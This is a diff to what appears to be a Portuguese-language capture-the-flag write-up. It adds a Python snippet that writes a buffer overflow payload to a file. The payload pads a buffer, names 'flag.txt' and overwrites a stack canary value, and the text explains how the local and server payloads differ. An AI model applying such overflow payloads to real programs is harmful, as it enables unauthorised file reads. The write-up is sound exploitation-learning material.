@@ -11,6 +11,12 @@ Localmente:
 `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag.txt\0\x24\x23\xfc\xfe`
 porque o canário("val") está declarado antes de "meme_file" e de "buffer".
 
+Para testar localmente:
+```
+with open('badfile', 'wb') as f:
+  f.write(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag.txt\0\x24\x23\xfc\xfe")
+```
+
 No servidor:
 `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x24\x23\xfc\xfeflag.txt\0`
 porque o canário("val") deve estar declarado entre "meme_file" e "buffer".
